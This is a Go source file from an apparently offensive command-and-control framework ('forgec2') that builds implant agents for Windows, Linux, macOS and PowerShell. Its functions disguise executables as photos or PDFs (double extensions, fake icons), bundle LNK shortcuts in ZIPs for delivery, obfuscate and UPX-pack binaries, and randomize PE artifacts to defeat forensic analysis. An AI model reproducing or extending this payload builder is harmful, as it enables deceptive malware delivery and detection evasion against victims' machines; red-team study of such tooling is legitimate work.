package payload

import (
	"archive/zip"
	"bytes"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"text/template"
)

// GenerateWindowsEXE builds the Windows agent EXE (only via Generate page) using the embedded agent source + ldflags injection.
func GenerateWindowsEXE(cfg ImplantConfig, outputDir string) (string, error) {
	dataDir := filepath.Dir(outputDir)
	profile := NormalizeImplantConfig(&cfg, dataDir)
	if err := win7CompatConflict(&cfg); err != nil {
		return "", err
	}
	if err := slimTransportConflict(&cfg); err != nil {
		return "", err
	}

	// Create temp build dir
	tmpDir, err := os.MkdirTemp("", "forgec2-agent-*")
	if err != nil {
		return "", err
	}
	defer os.RemoveAll(tmpDir)

	// Make outputDir absolute to avoid issues with cmd.Dir
	if !filepath.IsAbs(outputDir) {
		if abs, err := filepath.Abs(outputDir); err == nil {
			outputDir = abs
		}
	}

	// Write agent source files from embed (supports agent.go + platform-specific agent_*.go)
	if err := extractAgentSources(payloadFS, tmpDir, cfg.Slim); err != nil {
		return "", err
	}

	// go.mod with required external dependencies
	goMod := buildGoMod("windows", false, cfg.Slim, cfg.Win7Compat)

	if err := os.WriteFile(filepath.Join(tmpDir, "go.mod"), []byte(goMod), 0644); err != nil {
		return "", err
	}
	if cfg.Win7Compat {
		if err := materializeWin7Shim(tmpDir); err != nil {
			return "", err
		}
	}

	ldflags, blob, sKey := buildLdflags(cfg, profile, "windows")

	// Windows icon / disguise handling (must be before go mod tidy so rsrc.syso is in tmpDir)
	if err := injectIconResource(tmpDir, cfg); err != nil {
		// Log but do not fail build — default Go icon is acceptable
		// Use fmt for now to avoid import cycle; slog available via log/slog
		fmt.Printf("icon injection warning: %v\n", err)
	}

	// Output filename — honor disguise: photo.jpg.exe / doc.pdf.exe / ...
	outName := cfg.Filename
	if outName == "" {
		outName = "forgec2_agent.exe"
	}
	// Disguise filename via the shared helper (single source of truth).
	outName = ApplyDisguiseFilename(outName, cfg.DisguiseAs)
	// Strip any directory components so a user-supplied filename containing
	// ".." or an absolute path cannot write outside outputDir (A1).
	outName = safeBuildFileName(outName)
	outPath := filepath.Join(outputDir, outName)
	if !filepath.IsAbs(outPath) {
		if abs, err := filepath.Abs(outPath); err == nil {
			outPath = abs
		}
	}
	// ensure the dir for outPath exists (use abs dir)
	outDir := filepath.Dir(outPath)
	if err := os.MkdirAll(outDir, 0750); err != nil {
		return "", err
	}

	// Run go mod tidy to resolve dependencies
	goCmd := getGoCmd()
	if goCmd == "" {
		return "", fmt.Errorf("go executable not found in PATH. Install Go from https://go.dev/dl/ or set the GO_BINARY environment variable")
	}
	if err := runGoModTidy(goCmd, tmpDir, cfg.Win7Compat); err != nil {
		return "", err
	}

	// Build command - use explicit GOOS/GOARCH
	goarch, err := resolveBuildArch("windows", cfg.Architecture)
	if err != nil {
		return "", err
	}
	if err := buildAgentBinary(goCmd, tmpDir, ldflags, outPath, cfg.Obfuscate, "windows", goarch, blob, sKey, cfg.Win7Compat); err != nil {
		return "", err
	}

	// Post-build: full per-build PE forensic randomization (must run before
	// self-check patch so the hash covers final bytes).
	finalizePE(outPath, cfg, goarch)

	// Optional UPX compression (also before the self-check patch).
	if err := maybeCompressUPX(outPath, cfg, "exe"); err != nil {
		return "", err
	}

	// Self-integrity: embed the SHA-256 of the finalized binary (must run after
	// stripping so the hash matches what the agent reads at runtime).
	if cfg.SelfCheck {
		if err := patchSelfCheckHash(outPath); err != nil {
			return "", err
		}
	}

	// Fail loudly (rather than deliver a corrupt binary) if the produced exe is
	// malformed or the wrong architecture.
	if err := validatePE(outPath, windowsMachine(goarch)); err != nil {
		return "", fmt.Errorf("generated exe failed PE validation: %w", err)
	}

	if _, err := os.Stat(outPath); err != nil {
		return "", fmt.Errorf("build succeeded but no output file at %s: %w", outPath, err)
	}
	// Optional LNK shortcut alongside the exe — bundle as ZIP for single download
	if cfg.LNKDisguise {
		exeName := filepath.Base(outPath)
		lnkName := strings.TrimSuffix(exeName, ".exe")
		lnkName = strings.TrimSuffix(lnkName, ".EXE") + ".lnk"
		lnkPath := filepath.Join(outputDir, lnkName)
		if data, err := BuildLnkForExe(exeName); err == nil {
			if err := os.WriteFile(lnkPath, data, 0644); err != nil {
				fmt.Printf("lnk warning: failed to write %s: %v\n", lnkPath, err)
				return outPath, nil
			}
			// Create ZIP containing EXE + LNK for convenient single download
			zipName := strings.TrimSuffix(exeName, ".exe")
			zipName = strings.TrimSuffix(zipName, ".EXE") + ".zip"
			zipPath := filepath.Join(outputDir, zipName)
			zf, err := os.Create(zipPath)
			if err != nil {
				fmt.Printf("lnk warning: failed to create %s: %v\n", zipPath, err)
				return outPath, nil
			}
			zw := zip.NewWriter(zf)
			for _, p := range []string{outPath, lnkPath} {
				b, err := os.ReadFile(p)
				if err != nil {
					fmt.Printf("lnk warning: failed to read %s: %v\n", p, err)
					_ = zw.Close()
					_ = zf.Close()
					return outPath, nil
				}
				w, err := zw.Create(filepath.Base(p))
				if err != nil {
					fmt.Printf("lnk warning: zip entry failed for %s: %v\n", p, err)
					_ = zw.Close()
					_ = zf.Close()
					return outPath, nil
				}
				if _, err := w.Write(b); err != nil {
					fmt.Printf("lnk warning: zip write failed for %s: %v\n", p, err)
					_ = zw.Close()
					_ = zf.Close()
					return outPath, nil
				}
			}
			if err := zw.Close(); err != nil {
				fmt.Printf("lnk warning: zip close failed: %v\n", err)
				_ = zf.Close()
				return outPath, nil
			}
			if err := zf.Close(); err != nil {
				fmt.Printf("lnk warning: file close failed for %s: %v\n", zipPath, err)
				return outPath, nil
			}
			// Prefer returning ZIP when LNK is requested so BuildDownload serves both
			return zipPath, nil
		}
	}

	return outPath, nil
}

// GeneratePowerShellSource returns the complete PowerShell agent source code
// after executing the external template. This is the single source of truth.
func GeneratePowerShellSource(cfg ImplantConfig, dataDir string) (string, error) {
	NormalizeImplantConfig(&cfg, dataDir)

	tmplContent, err := payloadFS.ReadFile("powershell_template.ps1")
	if err != nil {
		return "", fmt.Errorf("powershell template not found in embed: %w", err)
	}

	tmpl, err := template.New("ps1").Funcs(template.FuncMap{"ps": psEscape}).Parse(string(tmplContent))
	if err != nil {
		return "", err
	}

	var buf bytes.Buffer
	if err := tmpl.Execute(&buf, cfg); err != nil {
		return "", err
	}
	return buf.String(), nil
}

// GeneratePowerShell creates a .ps1 agent file on disk (only via Generate page).
// Internally uses the full template.
func GeneratePowerShell(cfg ImplantConfig, outputDir string) (string, error) {
	ps1Code, err := GeneratePowerShellSource(cfg, filepath.Dir(outputDir))
	if err != nil {
		return "", err
	}

	outName := cfg.Filename
	if outName == "" {
		outName = "forgec2_agent.ps1"
	}
	outName = safeBuildFileName(outName)
	outPath := filepath.Join(outputDir, outName)
	if err := os.MkdirAll(outputDir, 0750); err != nil {
		return "", err
	}
	if err := os.WriteFile(outPath, []byte(ps1Code), 0644); err != nil {
		return "", err
	}
	return outPath, nil
}

// GenerateLinuxELF builds a Linux ELF agent binary via cross-compilation.
func GenerateLinuxELF(cfg ImplantConfig, outputDir string) (string, error) {
	dataDir := filepath.Dir(outputDir)
	profile := NormalizeImplantConfig(&cfg, dataDir)
	if err := win7CompatConflict(&cfg); err != nil {
		return "", err
	}
	if err := slimTransportConflict(&cfg); err != nil {
		return "", err
	}
	if cfg.UserAgent == defaultWindowsUA {
		cfg.UserAgent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
	}

	tmpDir, err := os.MkdirTemp("", "forgec2-agent-linux-*")
	if err != nil {
		return "", err
	}
	defer os.RemoveAll(tmpDir)

	if !filepath.IsAbs(outputDir) {
		if abs, err := filepath.Abs(outputDir); err == nil {
			outputDir = abs
		}
	}

	if err := extractAgentSources(payloadFS, tmpDir, cfg.Slim); err != nil {
		return "", err
	}

	goMod := buildGoMod("linux", false, cfg.Slim, cfg.Win7Compat)
	if err := os.WriteFile(filepath.Join(tmpDir, "go.mod"), []byte(goMod), 0644); err != nil {
		return "", err
	}
	if cfg.Win7Compat {
		if err := materializeWin7Shim(tmpDir); err != nil {
			return "", err
		}
	}

	ldflags, blob, sKey := buildLdflags(cfg, profile, "linux")

	outName := cfg.Filename
	if outName == "" {
		outName = "forgec2_agent"
	}
	// Linux binaries typically have no .exe
	if strings.HasSuffix(strings.ToLower(outName), ".exe") {
		outName = outName[:len(outName)-4]
	}
	outName = safeBuildFileName(outName)
	outPath := filepath.Join(outputDir, outName)
	if !filepath.IsAbs(outPath) {
		if abs, err := filepath.Abs(outPath); err == nil {
			outPath = abs
		}
	}
	outDir := filepath.Dir(outPath)
	if err := os.MkdirAll(outDir, 0750); err != nil {
		return "", err
	}

	goCmd := getGoCmd()
	if goCmd == "" {
		return "", fmt.Errorf("go executable not found in PATH. Install Go from https://go.dev/dl/ or set the GO_BINARY environment variable")
	}
	if err := runGoModTidy(goCmd, tmpDir, cfg.Win7Compat); err != nil {
		return "", err
	}
	goarch, err := resolveBuildArch("linux", cfg.Architecture)
	if err != nil {
		return "", err
	}
	if err := buildAgentBinary(goCmd, tmpDir, ldflags, outPath, cfg.Obfuscate, "linux", goarch, blob, sKey, cfg.Win7Compat); err != nil {
		return "", err
	}

	// Optional UPX compression (before the self-check patch below).
	if err := maybeCompressUPX(outPath, cfg, "elf"); err != nil {
		return "", err
	}

	if _, err := os.Stat(outPath); err != nil {
		return "", fmt.Errorf("build succeeded but no output file at %s: %w", outPath, err)
	}

	if cfg.SelfCheck {
		if err := patchSelfCheckHash(outPath); err != nil {
			return "", err
		}
	}

	return outPath, nil
}

// GenerateMacOS builds a macOS agent binary via cross-compilation.
func GenerateMacOS(cfg ImplantConfig, outputDir string) (string, error) {
	dataDir := filepath.Dir(outputDir)
	profile := NormalizeImplantConfig(&cfg, dataDir)
	if err := win7CompatConflict(&cfg); err != nil {
		return "", err
	}
	if err := slimTransportConflict(&cfg); err != nil {
		return "", err
	}
	if cfg.UserAgent == defaultWindowsUA {
		cfg.UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
	}

	tmpDir, err := os.MkdirTemp("", "forgec2-agent-macos-*")
	if err != nil {
		return "", err
	}
	defer os.RemoveAll(tmpDir)

	if !filepath.IsAbs(outputDir) {
		if abs, err := filepath.Abs(outputDir); err == nil {
			outputDir = abs
		}
	}

	if err := extractAgentSources(payloadFS, tmpDir, cfg.Slim); err != nil {
		return "", err
	}

	goMod := buildGoMod("darwin", false, cfg.Slim, cfg.Win7Compat)
	if err := os.WriteFile(filepath.Join(tmpDir, "go.mod"), []byte(goMod), 0644); err != nil {
		return "", err
	}
	if cfg.Win7Compat {
		if err := materializeWin7Shim(tmpDir); err != nil {
			return "", err
		}
	}

	ldflags, blob, sKey := buildLdflags(cfg, profile, "darwin")

	outName := cfg.Filename
	if outName == "" {
		outName = "forgec2_agent"
	}
	outName = safeBuildFileName(outName)
	outPath := filepath.Join(outputDir, outName)
	if !filepath.IsAbs(outPath) {
		if abs, err := filepath.Abs(outPath); err == nil {
			outPath = abs
		}
	}
	outDir := filepath.Dir(outPath)
	if err := os.MkdirAll(outDir, 0750); err != nil {
		return "", err
	}

	goCmd := getGoCmd()
	if goCmd == "" {
		return "", fmt.Errorf("go executable not found in PATH. Install Go from https://go.dev/dl/ or set the GO_BINARY environment variable")
	}
	if err := runGoModTidy(goCmd, tmpDir, cfg.Win7Compat); err != nil {
		return "", err
	}
	goarch, err := resolveBuildArch("darwin", cfg.Architecture)
	if err != nil {
		return "", err
	}
	if err := buildAgentBinary(goCmd, tmpDir, ldflags, outPath, cfg.Obfuscate, "darwin", goarch, blob, sKey, cfg.Win7Compat); err != nil {
		return "", err
	}

	if _, err := os.Stat(outPath); err != nil {
		return "", fmt.Errorf("build succeeded but no output file at %s: %w", outPath, err)
	}

	if cfg.SelfCheck {
		if err := patchSelfCheckHash(outPath); err != nil {
			return "", err
		}
	}

	return outPath, nil
}

// Note: Agents are ONLY produced via the Generate page (EXE + PS1 + Linux ELF + macOS).
// The PS1 template lives in powershell_template.ps1 as the canonical implementation.
